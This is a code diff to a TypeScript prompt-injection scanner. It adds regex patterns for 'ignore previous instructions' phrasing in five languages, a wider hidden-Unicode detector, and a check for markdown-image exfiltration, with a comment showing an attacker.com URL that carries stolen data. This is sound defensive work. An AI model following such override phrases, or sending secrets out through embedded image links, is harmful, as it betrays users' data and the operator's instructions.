@@ -275,12 +275,41 @@ export class SCPClient extends EventEmitter<SCPClientEvents> {
       }
     }
 
-    // Hidden Unicode
-    const hiddenUnicode = /[\u200B\u200C\u200D\u200E\u200F\u202A-\u202E\uFEFF]/;
+    // Multi-language injection phrases (high-confidence, common in real-world attacks)
+    const multiLangPatterns = [
+      /ignor(?:a|ez)\s+(?:les|las|todas?\s+las)\s+instrucciones?\s+(?:anteriores|previas)/i,  // Spanish
+      /ignorez?\s+(?:les|toutes?\s+les)\s+instructions?\s+(?:pr[eé]c[eé]dentes?|ant[eé]rieures?)/i,  // French
+      /ignoriere?\s+(?:alle\s+)?(?:vorherigen?|bisherigen?)\s+(?:Anweisungen|Instruktionen)/i,  // German
+      /前の指示を(?:無視|忘れ)/,  // Japanese: "ignore previous instructions"
+      /이전\s*(?:지시|명령).*(?:무시|잊어)/,  // Korean: "ignore previous instructions"
+    ];
+
+    for (const pattern of multiLangPatterns) {
+      if (pattern.test(content)) {
+        findings.push({
+          category: 'power_words',
+          description: `Multi-language injection detected: ${pattern.source}`,
+          severity: 'high',
+        });
+      }
+    }
+
+    // Hidden Unicode (expanded range: ZWC, bidi overrides, tag chars, interlinear annotation)
+    const hiddenUnicode = /[\u200B-\u200F\u2028-\u202F\u2060-\u2064\u2066-\u206F\uFEFF\uFFF9-\uFFFB]|\uDB40[\uDC01-\uDC7F]/;
     if (hiddenUnicode.test(content)) {
       findings.push({
         category: 'homoglyphs',
         description: 'Hidden Unicode characters detected',
+        severity: 'high',
+      });
+    }
+
+    // Markdown image exfiltration: ![](http://attacker.com/steal?data=...)
+    const markdownExfil = /!\[.*?\]\(https?:\/\/[^)]*(?:token|key|secret|password|credential|ssn|credit)/i;
+    if (markdownExfil.test(content)) {
+      findings.push({
+        category: 'structural_anomalies',
+        description: 'Markdown image data exfiltration attempt',
         severity: 'high',
       });
     }
@@ -400,10 +429,10 @@ export class SCPClient extends EventEmitter<SCPClientEvents> {
       }
       if (tier === 'reversal') {
         let sanitized = content;
-        for (const pattern of overridePatterns) {
+        for (const pattern of [...overridePatterns, ...jailbreakPatterns, ...multiLangPatterns]) {
           sanitized = sanitized.replace(pattern, '[REDACTED]');
         }
-        sanitized = sanitized.replace(hiddenUnicode, '');
+        sanitized = sanitized.replace(new RegExp(hiddenUnicode.source, 'g'), '');
         return {
           tier,
           findings,
